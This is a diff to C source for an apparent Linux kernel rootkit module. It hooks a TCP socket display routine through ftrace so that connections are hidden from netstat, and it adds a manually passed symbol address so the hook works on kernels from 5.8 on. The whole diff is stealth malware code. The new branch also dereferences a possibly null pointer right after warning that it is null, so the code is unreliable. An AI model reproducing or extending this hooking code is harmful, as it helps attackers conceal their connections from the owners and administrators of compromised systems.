@@ -31,9 +31,16 @@ static void notrace register_callback_hook(unsigned long ip, unsigned long paren
 #endif
 }
 
-static int fh_resolve_hook_address(struct ftrace_hook *hook)
+static int fh_resolve_hook_address(struct ftrace_hook *hook, unsigned long * addr)
 {
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,8,0)
 	hook->addr = kallsyms_lookup_name(hook->name);
+#else
+    if(addr == 0)
+            printk(KERN_ALERT "hook->addr couldent find addr -> kallsyms_lookup_name unexported and manual addr dosent added!");
+    hook->addr = *addr;
+
+#endif
 
 	if (!hook->addr)
 	{
@@ -50,13 +57,13 @@ static int fh_resolve_hook_address(struct ftrace_hook *hook)
 	return 0;
 }
 
-static int netstat_install_hook(struct ftrace_hook *f_hook)
+static int netstat_install_hook(struct ftrace_hook *f_hook, unsigned long * f_addr)
 {
     int ret;
     //fill the structs
     //we asume that his name and hook func already configired
     
-    ret = fh_resolve_hook_address(f_hook);
+    ret = fh_resolve_hook_address(f_hook, f_addr);
     if (ret)
         return ret;
     f_hook->ops.func = register_callback_hook;
@@ -84,10 +91,10 @@ void fh_remove_hook(struct ftrace_hook *hook)
 }
 
 
-static int netstat_hide(void)
+static int socket_hide(unsigned long * addr)
 {
     int ret;
-    ret = netstat_install_hook(&tcp4_hook);
+    ret = netstat_install_hook(&tcp4_hook, addr);
     printk(KERN_ALERT "set ops done, ret equals to : %d", ret);
 
     return ret;
